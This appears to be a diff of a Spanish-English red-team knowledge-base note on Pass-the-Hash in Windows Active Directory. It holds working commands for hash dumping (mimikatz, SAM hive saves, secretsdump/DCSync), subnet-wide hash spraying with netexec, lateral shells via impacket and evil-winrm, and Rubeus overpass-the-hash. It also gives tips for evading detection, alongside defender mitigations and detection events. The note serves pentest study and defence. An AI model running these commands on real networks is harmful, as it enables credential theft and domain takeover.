@@ -4,7 +4,7 @@ aliases:
   - NTLM Pass-the-Hash
   - Hash Spray
 tags:
-  - type/atomic
+  - type/vulnerability
   - technique/lateral-movement
   - technique/credential-access
   - env/windows
@@ -14,195 +14,358 @@ primary categories:
   - "[[Red Team]]"
 secondary categories:
   - "[[Explotación]]"
-tertiary categories:
   - "[[Active Directory]]"
-type: Atomic
+tertiary categories:
+  - "[[Active Directory Explotación]]"
+type: CheatSheet
 linked:
-  - "[[Active Directory Explotación 1]]"
+  - "[[Pass-the-Hash - Hash Sources y Formats]]"
+  - "[[Pass-the-Hash - SMB Lateral]]"
+  - "[[Pass-the-Hash - WinRM y RDP]]"
+  - "[[Pass-the-Hash - Mimikatz Injection]]"
+  - "[[Pass-the-Hash - Overpass-the-Hash y Hash Spray]]"
+  - "[[Pass-the-Hash - Tooling]]"
   - "[[Kerberos Pass-the-Ticket]]"
   - "[[LSASS Dumping]]"
   - "[[DCSync]]"
+  - "[[netexec]]"
+  - "[[Impacket Toolkit]]"
 ---
 # Pass-the-Hash
 
 ***
 
 ## Cheatsheet
-^pass-the-hash
 
-| Tool | Command |
-| --- | --- |
-| **netexec (SMB)** | `nxc smb TARGET -u user -H NTHASH` |
-| **netexec (domain)** | `nxc smb TARGETS -u user -H HASH -d dom.local` |
-| **netexec local-auth** | `nxc smb TARGET -u administrator -H HASH --local-auth` |
-| **impacket-psexec** | `impacket-psexec -hashes :NTHASH dom.local/user@TARGET` |
-| **impacket-wmiexec** | `impacket-wmiexec -hashes :NTHASH dom.local/user@TARGET` |
-| **impacket-smbexec** | `impacket-smbexec -hashes :NTHASH dom.local/user@TARGET` |
-| **evil-winrm** | `evil-winrm -i TARGET -u user -H NTHASH` |
-| **xfreerdp (RestrictedAdmin)** | `xfreerdp /v:TARGET /u:user /pth:NTHASH` |
-| **pth-winexe / pth-* suite** | `pth-winexe -U dom/user%:NTHASH //TARGET cmd.exe` |
-| **mimikatz on-host** | `sekurlsa::pth /user:admin /domain:dom.local /ntlm:HASH /run:cmd.exe` |
+### 🔑 Hash Sources & Formats
 
-***
+````tabs
+tab: **Hash Format**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-format]]
 
-## Concepto
+tab: **LSASS Dump**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-lsass]]
 
-Windows NTLM autentica con el **NT hash** de la password, no la password misma. Si capturaste el hash (via LSASS, SAM, DCSync, NTDS), podés autenticarte a cualquier servicio que acepte NTLM sin crackearlo.
+tab: **SAM (Local Hashes)**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-sam]]
 
-Formato hash: `aad3b435b51404eeaad3b435b51404ee:abc123NTHASH` (LM:NT). LM suele ser blank en dominios modernos; solo NT importa.
+tab: **NTDS.dit Extraction**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-ntds]]
 
-## Requisitos
+tab: **DCSync → Hashes**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-dcsync]]
 
-- NT hash del user target.
-- Servicio destino acepta NTLM (SMB, WinRM, RDP con RestrictedAdmin, etc.).
-- User con permisos en destino (local admin, Remote Management Users, etc.).
+tab: **NetNTLMv2 (no es PtH)**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-netntlmv2]]
 
-## 1. Obtener hashes
+tab: **Cached Credentials (mscash)**
+![[Pass-the-Hash - Hash Sources y Formats#^pth-mscash]]
+````
 
-### LSASS dump
+### 🚀 SMB Lateral
+
+````tabs
+tab: **netexec / crackmapexec**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-nxc]]
+
+tab: **Impacket-PsExec**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-psexec]]
+
+tab: **Impacket-WMIExec**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-wmiexec]]
+
+tab: **Impacket-SMBExec**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-smbexec]]
+
+tab: **Impacket-DComExec**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-dcomexec]]
+
+tab: **Impacket-AtExec**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-atexec]]
+
+tab: **Method Comparison**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-comparison]]
+
+tab: **Pre-PtH Validation**
+![[Pass-the-Hash - SMB Lateral#^pth-smb-validate]]
+````
+
+### 🖥️ WinRM y RDP
+
+````tabs
+tab: **evil-winrm (Linux)**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-evilwinrm]]
+
+tab: **netexec WinRM**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-nxc]]
+
+tab: **Impacket-WMIExec (alt)**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-wmiexec]]
+
+tab: **RDP RestrictedAdmin (PtH)**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-rdpfreerdp]]
+
+tab: **RestrictedAdmin Status**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-restrictedadmin]]
+
+tab: **WinRM Permissions Audit**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-perms]]
+
+tab: **OPSEC Considerations**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-opsec]]
+
+tab: **Common Errors**
+![[Pass-the-Hash - WinRM y RDP#^pth-winrm-errors]]
+````
+
+### 💉 Mimikatz Injection
+
+````tabs
+tab: **sekurlsa::pth Basic**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-basic]]
+
+tab: **Post-Injection Tools**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-tools]]
+
+tab: **mimikatz vs Impacket**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-comparison]]
+
+tab: **Process Tree / Detection**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-detection]]
+
+tab: **Stealth: Process Lineage**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-stealth]]
+
+tab: **Cleanup**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-cleanup]]
+
+tab: **Common Errors**
+![[Pass-the-Hash - Mimikatz Injection#^pth-mimi-errors]]
+````
+
+### 🎫 Overpass-the-Hash & Spray
+
+````tabs
+tab: **Overpass-the-Hash Concept**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-concept]]
+
+tab: **Rubeus asktgt (Windows)**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-rubeus]]
+
+tab: **getTGT.py (Linux)**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-gettgt]]
+
+tab: **mimikatz Overpass**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-mimi]]
+
+tab: **Hash Spray (1 hash × N targets)**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-spray]]
+
+tab: **1 user × N hashes**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-multihash]]
+
+tab: **Cross-Domain Spray**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-cross]]
+
+tab: **Spray + Pivoting**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-pivot]]
+
+tab: **Common Errors**
+![[Pass-the-Hash - Overpass-the-Hash y Hash Spray#^pth-overpass-errors]]
+````
+
+### 🛠️ Tooling
+
+````tabs
+tab: **netexec / crackmapexec**
+![[Pass-the-Hash - Tooling#^pth-tool-nxc]]
+
+tab: **Impacket**
+![[Pass-the-Hash - Tooling#^pth-tool-impacket]]
+
+tab: **evil-winrm**
+![[Pass-the-Hash - Tooling#^pth-tool-evilwinrm]]
+
+tab: **mimikatz**
+![[Pass-the-Hash - Tooling#^pth-tool-mimi]]
+
+tab: **Rubeus**
+![[Pass-the-Hash - Tooling#^pth-tool-rubeus]]
+
+tab: **pth-suite (Legacy)**
+![[Pass-the-Hash - Tooling#^pth-tool-pthsuite]]
+
+tab: **xfreerdp**
+![[Pass-the-Hash - Tooling#^pth-tool-xfreerdp]]
+
+tab: **Recursos**
+![[Pass-the-Hash - Tooling#^pth-tool-resources]]
+````
+
+___
+
+## Overview
+
+**Pass-the-Hash (PtH)** = autenticarse a servicios NTLM-aware usando el **NT hash** del usuario en lugar del password cleartext. Foundational lateral movement technique en Active Directory — Windows NTLM nunca verifica el password real, solo el hash.
+
+**Hash format:** `aad3b435b51404eeaad3b435b51404ee:abc123def456...` (LM:NT). LM siempre blank en domains modernos. Solo NT hash importa (32 hex chars).
+
+**Sources:** LSASS dump (mimikatz), SAM hive (local), NTDS.dit (DCSync / offline), DCSync vía DRSUAPI.
+
+### Cuándo es alto impacto
+
+| **Hash type** | **Impacto** |
+|---|---|
+| Local Administrator hash + reuse | Hash spray subnet → mass compromise (CVSS Critical). |
+| Domain Admin NT hash | Direct DCSync + Golden Ticket (CVSS Critical). |
+| Service account NT hash | Lateral + Kerberoast adjacent (CVSS High). |
+| User hash (low-priv) | Lateral foothold (CVSS Medium). |
+| krbtgt hash | Golden Ticket persistente (CVSS Critical). |
+
+### Diferencia con técnicas adyacentes
+
+| | **PtH** | **Pass-the-Ticket** | **Overpass-the-Hash** |
+|---|---|---|---|
+| Credential | NT hash | Kerberos TGT/TGS | NT hash → TGT request |
+| Auth protocol | NTLM | Kerberos | Kerberos |
+| Target accepts | Windows NTLM-aware | Kerberos-aware | Kerberos-aware |
+| Detection | NTLM events (4624 type 3) | Less detection | Bypass NTLM detection |
+
+___
+
+## Workflow
+
 ```
-mimikatz # sekurlsa::logonpasswords
-mimikatz # sekurlsa::msv
+1. Cred extraction:
+   - LSASS dump (mimikatz / comsvcs / nanodump)
+   - SAM hive (local Administrator hash)
+   - DCSync (forest-wide hashes)
+   - NTDS.dit offline (Backup Operators)
+
+2. Hash format identification:
+   - Full LM:NT vs NT only
+   - NT hash = 32 hex chars
+
+3. Pre-attack validation:
+   - nxc smb <target> -u user -H <NT> (validate auth)
+   - Check share access, sessions, etc.
+
+4. Method selection:
+   a. SMB lateral (psexec/wmiexec/smbexec/dcomexec)
+   b. WinRM (evil-winrm)
+   c. RDP RestrictedAdmin (xfreerdp /pth)
+   d. Mimikatz injection (on-host Windows)
+   e. Overpass-the-Hash (Rubeus / getTGT)
+
+5. Hash reuse exploitation:
+   - Local admin hash spray sobre subnet
+   - Domain user hash → multi-host access
+
+6. Privesc chain:
+   - Local hash → LSASS dump más users
+   - Domain user → DCSync → krbtgt
+   - krbtgt → Golden Ticket persistence
+
+7. Cleanup:
+   - klist purge
+   - Close injected processes
 ```
 
-### SAM (local)
-```cmd
-reg save HKLM\SAM SAM
-reg save HKLM\SYSTEM SYSTEM
-impacket-secretsdump LOCAL -sam SAM -system SYSTEM
-```
+___
 
-### DCSync → hashes de dominio
-Ver [[DCSync]].
+## Detección rápida
 
-### NTDS.dit
 ```bash
-impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM
+# 1. Validate hash + auth
+NT="aabbccdd1122334455..."
+nxc smb 10.10.10.5 -u atacante -H $NT
+
+# 2. Hash reuse subnet sweep
+nxc smb 10.10.10.0/24 -u administrator -H $NT --local-auth | grep "Pwn3d"
+
+# 3. Lateral RCE
+impacket-wmiexec -hashes :$NT corp.local/atacante@10.10.10.5
+
+# 4. Overpass-the-Hash → TGT
+impacket-getTGT corp.local/atacante -hashes :$NT -dc-ip 10.10.10.10
+export KRB5CCNAME=atacante.ccache
+
+# 5. DCSync con hash
+impacket-secretsdump corp.local/atacante@10.10.10.10 -hashes :$NT -just-dc
 ```
 
-### Responder (NetNTLMv2) — **NO es PtH directo**
-NetNTLMv2 hash solo para crack/relay, no para PtH. Confusión común.
+___
 
-## 2. PtH local (local account)
+## Impacto
 
-```bash
-# Admin local vía hash
-nxc smb 10.10.10.5 -u administrator -H abc123NTHASH --local-auth
+- **Local admin hash reuse** — most common privesc → mass compromise.
+- **Domain user PtH** — lateral foothold + recon authenticated.
+- **Service account hash** — kerberoast adjacent + lateral via SPNs.
+- **Domain Admin hash** — DCSync → krbtgt → Golden Ticket.
+- **krbtgt hash** — domain takeover persistente.
+- **Computer account hash** — lateral via computer account auth (RBCD adjacent).
+- **gMSA hash** — service identity + cross-host lateral.
+- **Backup Operators member hash** — NTDS.dit dump path.
+- **Trust account hash** — cross-trust forge (inter-realm TGT).
 
-# Pass-the-hash spray sobre rango (local admin reuse)
-nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth
+___
 
-# Con shell
-impacket-psexec -hashes :NTHASH administrator@10.10.10.5
-```
+## Mitigación (defender)
 
-## 3. PtH dominio
+- **LAPS / LAPSv2** — local admin pwd único por host → hash spray rompe.
+- **Protected Users group** — desactiva NTLM auth para members + 4h TGT lifetime.
+- **Credential Guard** (VBS) — VSM aísla LSASS, hash dump bloqueado.
+- **Restricted Admin RDP** — no deja creds en memoria post-RDP.
+- **Disable NTLM** o `Restrict NTLM in this domain` GPO — kill NTLM-only targets.
+- **Tier model (T0/T1/T2)** — DA never logon en workstations.
+- **WDigest disable** — no cleartext en LSASS (default Win 8.1+).
+- **Detection events**:
+  - `Event 4624 logon type 3` con `Authentication Package: NTLM` desde host inesperado.
+  - `Event 4776` en DC con error `0xC000006A` (bad password) en bulk = brute.
+  - Sysmon Event 10 (LSASS access) → mimikatz detection.
+- **MDI alerts**:
+  - `Suspected identity theft (pass-the-hash)`
+  - `Suspicious authentication failures (Honeytoken activity)`
+- **PingCastle audit** rule `S-PwdLastSet-Reversible` + `T1-Pth` indicators.
 
-```bash
-# netexec
-nxc smb TARGET -u user -H NTHASH -d dom.local
+___
 
-# Enum shares, users, sessions
-nxc smb TARGETS -u user -H NTHASH --shares --sessions --loggedon-users
+## Para entender PtH
 
-# impacket
-impacket-psexec dom.local/user@TARGET -hashes :NTHASH
-impacket-wmiexec dom.local/user@TARGET -hashes :NTHASH  # menos ruidoso
-impacket-smbexec dom.local/user@TARGET -hashes :NTHASH  # sin drop binary
-impacket-dcomexec dom.local/user@TARGET -hashes :NTHASH  # MMC20/ShellWindows
-```
+**Por qué NTLM es vulnerable:** NTLM challenge-response usa el **NT hash directamente** como key para HMAC. No hay "password" en el wire — solo derivación criptográfica del hash. Server compara HMAC esperado con HMAC recibido. Si tenés hash, calculás HMAC = autenticación válida sin saber password.
 
-## 4. PtH WinRM
+**Por qué LM hash es legacy:** LM (LAN Manager) hash divide password en 2 chunks de 7 chars + uppercase + DES = trivial crack. Disabled default Win Vista+. `aad3b435b51404eeaad3b435b51404ee` = LM hash de string vacío.
 
-```bash
-# evil-winrm
-evil-winrm -i TARGET -u user -H NTHASH
+**Por qué Overpass-the-Hash existe:** Kerberos auth en domains modernos. NTLM auth = anomalía → MDI alerts. Overpass = NT hash → request TGT → use TGT = looks like normal Kerberos auth = bypass NTLM detection.
 
-# netexec
-nxc winrm TARGET -u user -H NTHASH -x 'whoami'
+**Por qué Restricted Admin RDP no protege contra PtH 100%:** RestrictedAdmin RDP **previene cred theft hacia el target** (no envía password al RDP server). PERO **acepta hash via /pth** = atacante con hash entra. Solo proteje target server, no source attack.
 
-# impacket
-impacket-wmiexec -hashes :NTHASH dom.local/user@TARGET
-```
+**Por qué Credential Guard rompe PtH local:** Credential Guard mueve LSASS secrets a Virtual Secure Mode (VSM) — proceso aislado por hypervisor. mimikatz no puede leer hashes. Disabled default fuera de Windows Enterprise + UEFI Secure Boot.
 
-Requiere user en `Remote Management Users` o `Administrators` local.
+**Por qué LAPS mata hash spray:** LAPS rota password local Administrator únicamente per host. Hash de Host A ≠ hash de Host B. Hash spray entre hosts no funciona.
 
-## 5. PtH RDP (RestrictedAdmin)
+**Por qué Protected Users es el hardening fuerte:** miembros del group:
+- NTLM auth disabled (forced Kerberos).
+- AES required (no RC4).
+- TGT lifetime 4h (no 10h default).
+- No delegation (TGT/cached creds removed post-logoff).
 
-```bash
-# Linux
-xfreerdp /v:TARGET /u:user /d:dom.local /pth:NTHASH /dynamic-resolution
-```
+Tier 0 admins en Protected Users = inmunes a PtH/Overpass/Kerberoast clásico.
 
-Requiere en el target:
-```cmd
-reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
-```
-
-Set vía GPO en dominio o abuso post-exploitation (no default).
-
-## 6. PtH + mimikatz on-host (inyección)
-
-```
-mimikatz # privilege::debug
-mimikatz # sekurlsa::pth /user:administrator /domain:dom.local /ntlm:NTHASH /run:cmd.exe
-```
-
-Abre cmd con credenciales inyectadas → usar herramientas normales de Windows (`net use \\target\c$`, `PsExec.exe`, etc.).
-
-## 7. OverPass-the-Hash (Hash → Kerberos TGT)
-
-Convierte PtH a Kerberos → evade detección NTLM-only.
-
-```powershell
-# Rubeus
-.\Rubeus.exe asktgt /user:administrator /rc4:NTHASH /domain:dom.local /ptt
-
-# Con AES (menos crackeable)
-.\Rubeus.exe asktgt /user:administrator /aes256:AESKEY /domain:dom.local /ptt
-
-# Entonces ticket inyectado:
-dir \\dc\c$
-```
-
-Ver [[Kerberos Pass-the-Ticket]].
-
-## 8. Password spray con hashes
-
-```bash
-# Un hash sobre muchos users
-nxc smb TARGET -u users.txt -H NTHASH --continue-on-success
-
-# Hashes sobre users diferentes
-nxc smb TARGETS -u users.txt -H hashes.txt --no-bruteforce --continue-on-success
-```
-
-## 9. OpSec
-
-### Detecciones NTLM
-- **Event 4624** logon type 3 con "Authentication Package: NTLM" sobre host que normalmente usa Kerberos.
-- **Event 4776** en DC con error 0xC000006A si el user correcto con hash errado.
-- EDR correlaciona process lineage (cmd.exe spawned from `sekurlsa::pth`).
-
-### Evasion
-- Preferir Over-PtH (Kerberos) en dominios que loguean NTLM agresivamente.
-- `wmiexec` / `dcomexec` más silenciosos que `psexec` (no crea service).
-- Evitar PtH hacia DCs directamente — triggerea alertas.
-- Local admin PtH es más aceptable (no toca AD).
-
-## 10. Mitigaciones del blue
-
-- **Protected Users** group — desactiva NTLM + retiene no cached creds.
-- **LAPS** — password local admin único por host → PtH spray rompe.
-- **Restricted Admin** mode evita dejar creds en memoria tras RDP.
-- **Credential Guard** — VSM aísla LSASS.
-- **Disable NTLM** o restringir con `Restrict NTLM` GPO.
-- **Account Tiering** (T0/T1/T2) — DA no loguea en workstations.
+___
 
 ## Recursos
 
-- [HackTricks - PtH](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash)
-- [Microsoft - Mitigating PtH](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
-- [impacket examples](https://github.com/fortra/impacket/tree/master/examples)
+- [Microsoft - Mitigating Pass-the-Hash and Other Credential Theft v2](https://www.microsoft.com/download/details.aspx?id=36036)
+- [HackTricks - Pass the Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash) — comprehensive.
+- [The Hacker Recipes - PtH](https://www.thehacker.recipes/ad/movement/ntlm/pth) — reference.
+- [Impacket repo](https://github.com/fortra/impacket) — tools.
+- [Rubeus](https://github.com/GhostPack/Rubeus) — Kerberos toolkit.
+- [Mimikatz](https://github.com/gentilkiwi/mimikatz) — cred toolkit.
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) — WinRM client.
+- [netexec docs](https://www.netexec.wiki) — multi-protocol.
+- [SpecterOps - Credential Theft Shuffle](https://posts.specterops.io/an-introduction-to-manipulating-and-attacking-active-directory-credential-theft-shuffle-c4dad77f4daa) — analysis.
+- [MITRE ATT&CK T1550.002](https://attack.mitre.org/techniques/T1550/002/) — Pass the Hash.
+- [MITRE ATT&CK T1003](https://attack.mitre.org/techniques/T1003/) — OS Credential Dumping (sources).
 
 ***
